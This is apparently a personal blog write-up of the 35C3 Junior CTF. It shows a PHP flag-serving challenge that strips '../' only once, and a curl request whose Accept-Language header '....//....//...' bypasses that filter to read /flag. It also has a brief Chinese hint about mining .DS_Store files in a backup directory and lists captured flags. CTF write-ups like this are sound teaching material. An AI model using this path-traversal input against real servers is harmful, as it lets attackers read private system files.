---
title: 35c3ctf
date: 2018-12-28 12:41:03
tags:
---



# Junoir  ctf

## WEB

### flags

```
<?php
  highlight_file(__FILE__);
  $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'ot';
  $lang = explode(',', $lang)[0];
  $lang = str_replace('../', '', $lang);
  $c = file_get_contents("flags/$lang");
  if (!$c) $c = file_get_contents("flags/ot");
  echo '<img src="data:image/jpeg;base64,' . base64_encode($c) . '">';
```

 ```
ht@TIANJI:/mnt/d/ht-blog$ curl -H "Accept-Language:....//....//....//....//flag" "http://35.207.132.47:84/" | grep -oE Mz.*= | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2707  100  2707    0     0   5745      0 --:--:-- --:--:-- --:--:--  5759
35c3_this_flag_is_the_be5t_fl4g
 ```

### McDonald

```
在backup目录下找.DS_Store,然后不断的找就行
```



# 35C3

# check 

35C3_use_this_to_decrypt_encrypted_downloads